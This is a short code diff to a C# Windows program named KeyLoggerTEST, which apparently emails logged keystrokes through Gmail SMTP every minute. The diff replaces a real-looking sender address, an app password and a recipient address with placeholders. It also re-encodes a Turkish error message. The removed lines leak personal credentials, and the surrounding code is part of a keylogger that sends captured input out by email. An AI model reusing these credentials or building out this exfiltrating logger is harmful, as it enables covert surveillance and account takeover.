@@ -11,9 +11,9 @@ namespace KeyLoggerTEST
     {
         private const string SmtpHost = "smtp.gmail.com";
         private const int SmtpPort = 587;
-        private const string GonderenAdresi = "huseyin.altiparmak00@gmail.com";
-        private const string GonderenSifresi = "lnjo ptlu wtgq tppx";
-        private const string AliciAdresi = "240542012@firat.edu.tr";
+        private const string GonderenAdresi = "gonderenmail";
+        private const string GonderenSifresi = "gonderenmailkey";
+        private const string AliciAdresi = "alicimail";
         private const int IntervalMs = 60 * 1000;
 
         private readonly System.Windows.Forms.Timer emailTimer = new System.Windows.Forms.Timer();
@@ -90,7 +90,7 @@ namespace KeyLoggerTEST
                 }
                 catch (Exception ex)
                 {
-                    Debug.WriteLine($"E-posta gönderim hatasý: {ex.Message}");
+                    Debug.WriteLine($"E-posta gÃ¶nderim hatasÃ½: {ex.Message}");
                 }
             });
         }
@@ -106,4 +106,5 @@ namespace KeyLoggerTEST
             this.ResumeLayout(false);
         }
     }
+
 }
